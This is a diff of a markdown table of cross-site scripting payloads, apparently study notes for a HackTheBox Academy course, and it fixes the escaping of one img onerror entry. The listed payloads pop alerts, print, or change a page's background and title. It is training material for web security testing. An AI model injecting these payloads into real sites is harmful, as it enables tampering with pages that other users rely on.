@@ -16,7 +16,7 @@ Execution of JavaScript code in an input field. Inherently a client focused vuln
 |<script>alert(window.origin)</script> 	|Basic XSS Payload|
 |<plaintext> |	Basic XSS Payload|
 |<script>print()</script> |	Basic XSS Payload|
-|\<img src="" onerror=alert(window.origin)>\ 	|HTML-based XSS Payload|
+|\<img src="" onerror=alert(window.origin)> 	|HTML-based XSS Payload|
 |<script>document.body.style.background = "#141d2b"</script> 	|Change Background Color|
 |<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> |	Change Background Image|
 |<script>document.title = 'HackTheBox Academy'</script> 	|Change Website Title|
